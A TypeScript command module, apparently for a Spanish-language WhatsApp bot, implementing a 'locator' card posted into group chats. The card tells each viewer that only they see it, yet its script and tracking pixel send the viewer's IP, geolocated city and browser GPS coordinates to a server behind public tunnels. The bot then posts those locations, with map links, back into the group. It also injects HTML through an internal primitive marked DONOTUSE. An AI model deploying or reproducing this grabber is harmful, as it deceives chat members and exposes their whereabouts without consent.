import { randomUUID } from "node:crypto";
import { spawn, execFileSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import { promises as fs, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── store ───────────────────────── */

type LocateSession = { id: string; group: string; author: string; msg: any; hits: Set<string>; createdAt: number };

const G = globalThis as any;
const sessions: Map<string, LocateSession> = (G.__locSessions ??= new Map());
const sockRef: { current: any } = (G.__locSock ??= { current: null });
const startedRef: { current: boolean } = (G.__locStarted ??= { current: false });

const TTL = 30 * 60 * 1000;
const PORT = Number(process.env.LOCATE_PORT || 8787);
const MASK = process.env.LOCATE_MASK_IP === "1";
const DEBUG = process.env.LOCATE_DEBUG === "1";
const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

const log = (...a: any[]) => DEBUG && console.log("[locate]", ...a);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function sweep() {
  const now = Date.now();
  for (const [id, s] of sessions) if (now - s.createdAt > TTL) sessions.delete(id);
}

function maskIp(ip: string) {
  const v4 = ip.split(".");
  return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip || "—";
}

/* ───────────────────────── cloudflared ───────────────────────── */

function binDir() {
  for (const d of [path.join(process.cwd(), ".locate"), path.join(tmpdir(), "locate-cf")]) {
    try { mkdirSync(d, { recursive: true }); return d; } catch {}
  }
  return path.join(tmpdir(), "locate-cf");
}

const BIN_DIR = binDir();
const BIN = path.join(BIN_DIR, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");

function assetName(): string | null {
  const a = process.arch;
  if (process.platform === "linux") {
    if (a === "x64") return "cloudflared-linux-amd64";
    if (a === "arm64") return "cloudflared-linux-arm64";
    if (a === "arm") return "cloudflared-linux-arm";
    return null;
  }
  if (process.platform === "win32") return a === "ia32" ? "cloudflared-windows-386.exe" : "cloudflared-windows-amd64.exe";
  if (process.platform === "darwin") return a === "arm64" ? "cloudflared-darwin-arm64.tgz" : "cloudflared-darwin-amd64.tgz";
  return null;
}

async function ensureBinary(): Promise<string | null> {
  if (existsSync(BIN)) return BIN;
  const name = assetName();
  if (!name) return null;

  const c = new AbortController();
  const timer = setTimeout(() => c.abort(), 15000);
  try {
    const r = await fetch(`https://github.com/cloudflare/cloudflared/releases/latest/download/${name}`, { redirect: "follow", signal: c.signal });
    if (!r.ok) return null;
    const buf = Buffer.from(await r.arrayBuffer());
    if (buf.length < 100_000) return null;

    if (name.endsWith(".tgz")) {
      const tmp = path.join(BIN_DIR, "cf.tgz");
      await fs.writeFile(tmp, buf);
      execFileSync("tar", ["-xzf", tmp, "-C", BIN_DIR], { stdio: "ignore" });
      await fs.unlink(tmp).catch(() => undefined);
    } else {
      await fs.writeFile(BIN, buf);
    }
    await fs.chmod(BIN, 0o755).catch(() => undefined);
    log("cloudflared descargado");
    return BIN;
  } catch (e: any) {
    log("descarga cloudflared falló:", e?.message);
    return null;
  } finally {
    clearTimeout(timer);
  }
}

/* ───────────────────────── túnel ───────────────────────── */

const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];

function has(cmd: string) {
  for (const probe of ["which", "command"]) {
    try {
      execFileSync(probe === "command" ? "sh" : probe, probe === "command" ? ["-c", `command -v ${cmd}`] : [cmd], { stdio: "ignore" });
      return true;
    } catch {}
  }
  return false;
}

type Provider = { name: string; cmd: string; args: string[]; re: RegExp };

function provider(name: string, bin: string | null): Provider | null {
  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
  switch (name) {
    case "lhr":
      if (!has("ssh")) return null;
      return { name, cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i };
    case "serveo":
      if (!has("ssh")) return null;
      return { name, cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i };
    case "cf":
      return bin ? { name, cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
    case "lt":
      if (!has(npx)) return null;
      return { name, cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i };
    default:
      return null;
  }
}

const tunnel = (G.__locTunnel ??= {
  url: "", proc: null as any, tries: 0, lastUrl: "", lastErr: "", who: "",
  order: ["lhr", "serveo", "cf", "lt"] as string[],
});

function baseUrl() {
  return (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "") || tunnel.url;
}

function killTunnel() {
  try { tunnel.proc?.kill("SIGKILL"); } catch {}
  tunnel.proc = null;
  tunnel.url = "";
}

async function alive(url: string) {
  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 5000);
    const r = await fetch(`${url}/__hc`, { signal: c.signal, cache: "no-store" as any });
    clearTimeout(t);
    return r.ok;
  } catch {
    return false;
  }
}

async function confirm(url: string) {
  for (let i = 0; i < 8; i++) {
    if (await alive(url)) return true;
    await sleep(1500);
  }
  return false;
}

function startTunnel(bin: string | null): Promise<string> {
  if (tunnel.proc) {
    return new Promise((r) => {
      const t = setInterval(() => { if (tunnel.url || tunnel.tries > 14) { clearInterval(t); r(tunnel.url); } }, 300);
    });
  }

  const forced = process.env.LOCATE_TUNNEL;
  const norm = forced === "ssh" ? "lhr" : forced;
  const order = norm && norm !== "auto" ? [norm] : tunnel.order;
  const name = order[tunnel.tries % order.length];
  const p = provider(name, bin);

  if (!p) {
    tunnel.tries++;
    tunnel.lastErr = `${name}: binario no disponible`;
    log("omitido", name);
    return Promise.resolve("");
  }

  tunnel.who = name;

  return new Promise((resolve) => {
    let done = false;
    let child: any;
    let tail = "";

    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch (e: any) {
      tunnel.tries++;
      tunnel.lastErr = `${name}: ${e?.message}`;
      return resolve("");
    }
    tunnel.proc = child;

    const finish = (v: string) => { if (done) return; done = true; clearTimeout(timer); resolve(v); };

    const onData = (buf: Buffer) => {
      const txt = buf.toString();
      if (DEBUG) tail = (tail + txt).slice(-400);
      const m = txt.match(p.re);
      if (m && !tunnel.url) {
        tunnel.url = m[0].replace(/\/+$/, "");
        tunnel.lastUrl = tunnel.url;
        tunnel.tries = 0;
        console.log(`[locate] túnel ${name} → ${tunnel.url}`);
        finish(tunnel.url);
      }
    };

    child.stdout?.on("data", onData);
    child.stderr?.on("data", onData);
    child.on("exit", (code: number) => {
      if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; }
      if (!done) {
        tunnel.tries++;
        tunnel.lastErr = `${name}: salió (${code}) ${tail.split("\n").filter(Boolean).pop() || ""}`.slice(0, 220);
        finish("");
      }
    });
    child.on("error", (e: any) => {
      tunnel.proc = null;
      tunnel.tries++;
      tunnel.lastErr = `${name}: ${e?.message}`;
      finish("");
    });

    const timer = setTimeout(() => {
      if (!tunnel.url) {
        try { child.kill("SIGKILL"); } catch {}
        tunnel.proc = null;
        tunnel.tries++;
        tunnel.lastErr = `${name}: timeout abriendo`;
        finish("");
      }
    }, 16000);
  });
}

async function ensureTunnel(): Promise<string> {
  const cur = baseUrl();
  if (cur) {
    if (await alive(cur)) return cur;
    if (await confirm(cur)) return cur;
  }

  killTunnel();
  const bin = await ensureBinary();

  for (let i = 0; i < 6; i++) {
    const url = await startTunnel(bin);
    if (!url) { await sleep(600); continue; }

    if (await confirm(url)) return url;

    tunnel.lastErr = `${tunnel.who}: abrió ${url} pero no respondió`;
    log("descartado", url);
    killTunnel();
  }

  return tunnel.lastUrl;
}

/* ───────────────────────── servidor ───────────────────────── */

function clientIp(req: any) {
  const h = req.headers || {};
  const raw = h["cf-connecting-ip"] || h["x-real-ip"] || String(h["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "";
  const ip = String(raw).replace(/^::ffff:/, "").trim();
  return ip === "::1" || ip === "127.0.0.1" ? "" : ip;
}

async function geoFromIp(ip: string) {
  try {
    const url = ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
    const r = await fetch(url, { headers: { "User-Agent": "locate-bot" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { ip: j.ip, city: j.city, region: j.region, country: j.country_name, lat: j.latitude, lon: j.longitude };
  } catch {
    return null;
  }
}

async function announce(s: LocateSession, ip: string, lat: number, lon: number, city?: string, region?: string, country?: string, src = "ip", acc = 0) {
  const key = `${ip}|${Math.round(lat * 250)}|${Math.round(lon * 250)}`;
  if (s.hits.has(key)) return;
  s.hits.add(key);

  const sock = sockRef.current;
  if (!sock) return;

  const place = [city, region, country].filter(Boolean).join(", ") || "desconocido";
  const text =
    `📍 *${place}*\n` +
    `\`${MASK ? maskIp(ip) : ip || "local"}\`\n` +
    `https://maps.google.com/?q=${lat},${lon}` +
    (src === "gps" ? `\n_precisión ±${acc} m_` : "");

  await sock.sendMessage(s.group, { text, mentions: [s.author] }, { quoted: s.msg }).catch(() => undefined);
}

function send(res: any, code: number, type: string, body: any) {
  res.writeHead(code, { "Content-Type": type, "Cache-Control": "no-store", "Access-Control-Allow-Origin": "*" });
  res.end(body);
}

async function handle(req: any, res: any) {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  const p = url.pathname;

  if (p === "/__hc") return send(res, 200, "text/plain", "ok");

  const j = p.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
  if (j) {
    const s = sessions.get(j[1]);
    if (!s) return send(res, 200, "application/javascript", "if(window.__locFail)window.__locFail();");
    const ip = clientIp(req);
    const geo = await geoFromIp(ip);
    if (!geo) return send(res, 200, "application/javascript", "if(window.__locFail)window.__locFail();");
    send(res, 200, "application/javascript",
      `window.paint(${JSON.stringify({ ip: MASK ? maskIp(geo.ip || ip) : geo.ip || ip, city: geo.city, region: geo.region, country: geo.country, lat: geo.lat, lon: geo.lon, src: "ip" })});`);
    await announce(s, geo.ip || ip, geo.lat, geo.lon, geo.city, geo.region, geo.country);
    return;
  }

  const m = p.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
  if (m) {
    const lat = Number(url.searchParams.get("lat"));
    const lon = Number(url.searchParams.get("lon"));
    if (!lat || !lon) return send(res, 400, "text/plain", "");
    const key = process.env.GMAPS_KEY;
    const src = key
      ? `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=16&size=600x280&markers=color:red%7C${lat},${lon}&key=${key}`
      : `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=16&size=600,280&l=map&pt=${lon},${lat},pm2rdm`;
    try {
      const up = await fetch(src, { headers: { "User-Agent": "Mozilla/5.0 locate-bot" } });
      const buf = Buffer.from(await up.arrayBuffer());
      if (!up.ok || buf.length < 200) throw new Error();
      return send(res, 200, up.headers.get("content-type") || "image/png", buf);
    } catch {
      return send(res, 302, "text/plain", "");
    }
  }

  const l = p.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
  if (l) {
    send(res, 200, "image/gif", GIF);
    const s = sessions.get(l[1]);
    if (!s) return;
    const ip = clientIp(req);
    let lat = Number(url.searchParams.get("lat")) || 0;
    let lon = Number(url.searchParams.get("lon")) || 0;
    let city = url.searchParams.get("city") || undefined;
    let region = url.searchParams.get("region") || undefined;
    let country = url.searchParams.get("country") || undefined;
    const acc = Number(url.searchParams.get("acc")) || 0;
    const src = url.searchParams.get("src") === "gps" ? "gps" : "ip";
    if (!lat || !lon) {
      const geo = await geoFromIp(ip);
      if (!geo) return;
      lat = geo.lat; lon = geo.lon; city = geo.city; region = geo.region; country = geo.country;
    }
    await announce(s, ip, lat, lon, city, region, country, src, acc);
    return;
  }

  send(res, 404, "text/plain", "");
}

function startServer() {
  if (startedRef.current) return;
  startedRef.current = true;

  const server: Server = createServer((req, res) => {
    handle(req, res).catch(() => { try { send(res, 500, "text/plain", ""); } catch {} });
  });
  server.on("error", (e: any) => { if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`); });
  server.listen(PORT, () => console.log(`[locate] escuchando :${PORT}`));
  setInterval(sweep, 5 * 60 * 1000).unref?.();
  process.once("exit", killTunnel);
}

/* ───────────────────────── tarjeta ───────────────────────── */

const buildLocatePayload = (o: { sid: string; base: string; name: string }) => {
  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background:#070b14;color:#e9edf7;padding:12px}
.wrap{max-width:430px;margin:0 auto}
.card{background:linear-gradient(165deg,#121a30,#0a0f1c 60%,#080c16);border:1px solid #22304d;border-radius:18px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.65)}
.head{display:flex;align-items:center;gap:10px;padding:14px 15px;border-bottom:1px solid #1b2740;background:linear-gradient(90deg,rgba(0,229,255,.10),rgba(0,229,255,0))}
.dot{width:9px;height:9px;border-radius:50%;background:#00e5ff;box-shadow:0 0 12px #00e5ff;animation:p 1.4s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
.title{font-size:12.5px;letter-spacing:1.4px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
.body{padding:16px 15px}
.hello{font-size:15px;font-weight:700;margin-bottom:4px}
.hello b{color:#00e5ff}
.sub{font-size:12px;color:#8fa3c4;margin-bottom:14px}
.row{display:flex;gap:8px;margin-bottom:8px}
.k{font-size:11px;color:#7f93b5;width:88px;flex:none}
.v{font-size:12.5px;font-weight:700;color:#fff;word-break:break-all}
.map{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px;background:#0d1424;position:relative;min-height:170px}
.map img{display:block;width:100%;height:190px;object-fit:cover}
.badge{position:absolute;left:8px;top:8px;font-size:9.5px;letter-spacing:.8px;font-weight:800;text-transform:uppercase;background:rgba(0,0,0,.72);color:#7cffb2;border:1px solid #2b6b4b;border-radius:6px;padding:3px 7px;z-index:2}
.foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between}
.err{font-size:12px;color:#ff8f8f}
</style>
<div class="wrap"><div class="card">
<div class="head"><div class="dot"></div><div class="title">Localizador</div></div>
<div class="body">
<div class="hello">Hola <b>@__NAME__</b></div>
<div class="sub" id="sub">Rastreando tu señal...</div>
<div id="out"></div>
</div>
<div class="foot"><span>solo tú ves esto</span><span id="st">·</span></div>
</div></div>
<script>
var SID="__SID__",BASE="__BASE__",ok=false;
function $(i){return document.getElementById(i)}
function paint(d){
  ok=true;
  $('sub').textContent='Esta es tu ubicación, @__NAME__';
  $('out').innerHTML=
   '<div class="row"><div class="k">IP pública</div><div class="v">'+(d.ip||'—')+'</div></div>'+
   '<div class="row"><div class="k">Ciudad</div><div class="v">'+(d.city||'—')+'</div></div>'+
   '<div class="row"><div class="k">Región</div><div class="v">'+(d.region||'—')+'</div></div>'+
   '<div class="row"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
   '<div class="row"><div class="k">Coordenadas</div><div class="v">'+Number(d.lat).toFixed(5)+', '+Number(d.lon).toFixed(5)+'</div></div>'+
   '<div class="map"><span class="badge">exacto</span><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'&t='+Date.now()+'"></div>';
  $('st').textContent=d.src==='gps'?'GPS':'IP';
  if(navigator.geolocation&&d.src!=='gps'){
    navigator.geolocation.getCurrentPosition(function(p){
      var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0)+
            '&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||'');
      var i=new Image();i.src=BASE+'/l/'+SID+q+'&t='+Date.now();
      paint({ip:d.ip,city:d.city,region:d.region,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude,src:'gps'});
    },function(){},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
  }
}
function __locFail(){
  if(ok)return;
  var i=new Image();i.src=BASE+'/l/'+SID+'?t='+Date.now();
  $('sub').textContent='No se pudo leer la red';
  $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
}
setTimeout(__locFail,9000);
</script>
<script src="__BASE__/j/__SID__.js"></script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [o.base],
        payload: html.replace(/__SID__/g, o.sid).replace(/__BASE__/g, o.base).replace(/__NAME__/g, o.name),
      },
    },
  };
};

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["localizar", "loc", "ubicar"],
  category: "group",
  description: "Lanza un localizador privado: cada quien ve su propia IP y mapa.",
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg } = ctx;

    if (!from.endsWith("@g.us")) {
      await reply("Solo funciona en grupos.").catch(() => undefined);
      return;
    }

    await react("🛰️").catch(() => undefined);
    startServer();

    const base = await ensureTunnel();
    if (!base) {
      await react("❌").catch(() => undefined);
      await reply(
        `${fytBold("Sin túnel")}.\n\n` +
          `Último error: ${tunnel.lastErr || "sin salida de ningún proveedor"}\n\n` +
          `Prueba *LOCATE_TUNNEL=ssh* o *LOCATE_TUNNEL=cf* con *LOCATE_DEBUG=1*.`,
      ).catch(() => undefined);
      return;
    }

    const author: string = (msg.key as any).participant || from;
    const num = author.split("@")[0].split(":")[0];

    let mentions: string[] = [author];
    let name = String((msg as any).pushName || "").trim();

    try {
      const meta: any = await sock.groupMetadata(from);
      mentions = meta.participants.map((p: any) => p.id);
      if (!mentions.includes(author)) mentions.push(author);
      if (!name) {
        const me = meta.participants.find((p: any) => p.id === author);
        name = String(me?.name || me?.notify || me?.verifiedName || "").trim();
      }
    } catch {}

    if (!name) name = num;

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);

    sessions.set(sid, { id: sid, group: from, author, msg, hits: new Set(), createdAt: Date.now() });
    sockRef.current = sock;
    setTimeout(() => sessions.delete(sid), TTL).unref?.();

    try {
      const ping = await sock.sendMessage(
        from,
        { text: `📍 @${num} activó el localizador.\n\nAbre la tarjeta de abajo — cada quien ve la suya.`, mentions },
        { quoted: msg },
      );

      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("🛰️ Localizador // LuferOS")
        .setFooter("Abre la tarjeta · cada quien ve la suya");

      rich.addSection(buildLocatePayload({ sid, base, name }));
      await rich.send(from, { quoted: ping ?? msg });

      await react("✅").catch(() => undefined);
    } catch {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Error")} al renderizar el localizador.`).catch(() => undefined);
    }
  },
};
